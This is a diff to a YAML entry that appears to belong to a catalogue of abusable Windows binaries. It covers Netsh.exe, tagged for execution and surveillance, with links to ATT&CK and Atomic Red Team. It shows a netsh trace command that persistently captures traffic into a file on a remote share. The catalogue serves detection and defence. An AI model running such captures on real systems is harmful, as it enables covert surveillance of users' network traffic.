@@ -2,8 +2,7 @@
 Name: Netsh.exe
 Description: Execute, Surveillance
 Author: ''
-Created: '2018-05-25'
-Categories: []
+Created: 2018-05-25
 Commands:
   - Command: |
           netsh.exe trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl IPv4.Address=!(<IPofRemoteFileShare>)
@@ -22,5 +21,3 @@ Resources:
   - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Persistence/Netsh_Helper_DLL.md
   - https://attack.mitre.org/wiki/Technique/T1128
   - https://twitter.com/teemuluotio/status/990532938952527873
-Notes: ''
-
